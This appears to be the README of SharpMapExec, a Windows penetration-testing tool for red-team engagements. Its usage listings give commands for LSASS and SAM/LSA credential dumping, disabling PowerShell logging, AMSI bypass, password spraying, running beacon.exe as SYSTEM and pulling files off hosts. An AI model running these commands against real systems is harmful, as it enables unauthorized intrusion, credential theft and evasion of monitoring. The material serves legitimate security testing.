# SharpMapExec

A sharpen version of [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec). This tool is made to simplify penetration testing of networks and to create a swiss army knife that is made for running on Windows which is often a requirement during insider threat simulation engagements.



Besides scanning for access it can be used to identify vulnerable configurations and exfiltrate data. The idea for the data exfiltration modules is to execute the least amount of necessary code on the remote computer. To accomplish this, the tool will download all the secrets to the loot directory and parse them locally.



You can specify if you want to use Kerberos or NTLM authentication. If you choose Kerberos, the tool will create a sacrificial token and use [Rubeus](https://github.com/GhostPack/Rubeus) to import/ask for the ticket. If NTLM is specified, the tool will use [SharpKatz](https://github.com/b4rtik/SharpKatz) `SetThreadToken` or  `LogonUser` impersonation.

```
SharpMapExec.exe
  usage:

    --- Cim ---
        Need plaintext password or the /impersonate flag
        SharpMapExec.exe ntlm cim /user:USER /password:PASSWORD /computername:TARGET

       Available Cim modules
          /m:enable_winrm                             (Runs Enable-PSRemoting -Force)
          /m:disable_winrm                            (Runs Disable-PSRemoting -Force)
          /m:disable_pslockdown                       (Modify __PSLockdownPolicy registry to disable CLM)
          /m:disable_pslogging                        (Modify registry to disable PowerShell Logging)
          /m:check_pslockdown                         (Check __PSLockdownPolicy registry)
          /m:check_pslogging                          (Check PowerShell Logging registry)

    --- Reg32 ---
        SharpMapExec.exe ntlm reg32 /user:USER /ntlm:HASH /computername:TARGET
        SharpMapExec.exe kerberos reg32 </user:USER /password:PASSWORD /domain:DOMAIN /dc:DC | /ticket:TICKET.Kirbi>  /computername:TARGET

       Reg32 modules
          /m:disable_pslockdown                       (Modify __PSLockdownPolicy registry to disable CLM)
          /m:check_pslockdown                         (Check __PSLockdownPolicy registry)
          /m:check_pslogging                          (Check PowerShell Logging registry)

    --- Smb ---
        SharpMapExec.exe ntlm smb /user:USER /ntlm:HASH /domain:DOMAIN /computername:TARGET
        SharpMapExec.exe kerberos smb </user:USER /password:PASSWORD /domain:DOMAIN /dc:DC | /ticket:TICKET.Kirbi>  /computername:TARGET

       Smb modules
          /m:shares                                   (Scan for accessible Smb shares)

    --- WinRm ---
        SharpMapExec.exe ntlm winrm /user:USER /password:PASSWORD /domain:DOMAIN /computername:TARGET
        SharpMapExec.exe kerberos winrm </user:USER /rc4:HASH  /domain:DOMAIN /dc:DC | /ticket:TICKET.Kirbi>  /computername:TARGET

       WinRm modules
          /m:exec /a:whoami                           (Invoke-Command)
          /m:exec /a:C:\beacon.exe /system            (Invoke-Command as System)
          /m:comsvcs                                  (Dump & parse lsass)
          /m:secrets                                  (Dump and Parse Sam, Lsa, and System Dpapi blobs)
          /m:assembly /p:Rubeus.exe /a:dump           (Execute local C# assembly in memory)
          /m:assembly /p:beacon.exe /system           (Execute local C# assembly as System in memory)
          /m:assembly /p:getMailBox.exe /delegwalk    (Execute local C# assembly in all unique delegation processes in memory)
          /m:download /path:C:\file /destination:file (Download file from host)
          /m:upload   /path:C:\file /destination:file (Upload file to host)

    --- Domain ---
        SharpMapExec.exe kerbspray /users:USERS.TXT /passwords:PASSWORDS.TXT /domain:DOMAIN /dc:DC
        SharpMapExec.exe tgtdeleg

    --- Ldap ---
        SharpMapExec.exe ntlm domain /user:USER /password:PASSWORD /domain:DOMAIN /dc:DC /m:MODULE
        SharpMapExec.exe kerberos ldap </user:USER /password:PASSWORD /domain:DOMAIN /dc:DC /m:MODULE | /ticket:TICKET.Kirbi>

       Ldap modules
          /m:spraydata                                (Download user and password policy)
```

### Smb

Can be used to scan for admin access, accessible Smb shares, Smb version and relay signing.

````
/m:shares                                  (Scan enumerated shares for access)
````

### WinRm

The beast. It has built-in Amsi bypass, JEA language breakout, JEA function analysis. Can be used for code execution, scaning for PsRemote access, vulnerable JEA endpoints, and data exfiltration.

````
/m:exec /a:whoami                           (Invoke-Command)
/m:exec /a:C:\beacon.exe /system            (Invoke-Command as System)
/m:comsvcs                                  (Dump Lsass Process)
/m:secrets                                  (Dump and Parse Sam, Lsa, and System Dpapi blobs)
/m:assembly /p:Rubeus.exe /a:dump           (Execute Local C# Assembly in memory)
/m:assembly /p:beacon.exe /system           (Execute Local C# Assembly as System in memory)
/m:download /path:C:\file /destination:file (Download File from Host)
````

### Domain

Currently supports domain password spraying and to create a TGT for the current user that can be used with the `/ticket` parameter to get the current context.

### Ldap

Download necessary data before pw spraying

```
/m:spraydata                                (Download user and password policy)
```



### Example usage

For easy or mass in-memory execution of C# assemblies

![](images/mass_assembly.png)

Kerberos password spraying then scanning for local admin access

![](images/spray+admin.png)

This project supports scanning JEA endpoints and will analyze source code of non default commands and check if the endpoint was not configured for `no-language` mode.

![](images/jea.png)

Discover local admin password reuse with an NT hash.

![](images/localadmin.png)

Mass dump Lsass process with built-in Microsoft signed DLL and saves it to the `loot` folder

![](images/lsassdump.png)

Executes in all delegation processes sorted by unique by users

![](images/delegwalk.png)

Scan for SMB signing and SMBv1

![](images/smbvscan.png)

And much more!

Some scenarios with Kerberos will require you to sync your clock with the DC and set the DNS

```powershell
net time \\DC01.hackit.local /set
Get-NetAdapter ethernet0* | Set-DnsClientServerAddress -ServerAddresses @('192.168.1.10')
```





### Acknowledgments

Projects that helped or are existing in this tool

* [Rubeus](https://github.com/GhostPack/Rubeus)              [@Harmj0y](https://twitter.com/harmj0y)
* [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)      [@Harmj0y](https://twitter.com/harmj0y)
* [SharpKatz](https://github.com/b4rtik/SharpKatz)         [@b4rtik](https://twitter.com/b4rtik)
* [Amsi.Fail](https://github.com/Flangvik/AMSI.fail)           [@Flangvik](https://twitter.com/Flangvik)
* [SharpSecDump](https://github.com/G0ldenGunSec/SharpSecDump) [@G0ldenGunSec](https://twitter.com/G0ldenGunSec)
* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)  [@byt3bl33d3r](https://twitter.com/byt3bl33d3r)
* [Pingcastle ](https://github.com/vletoux/pingcastle)         [@mysmartlogon](https://twitter.com/mysmartlogon)
* [SharpSpray](https://github.com/jnqpblc/SharpSpray)

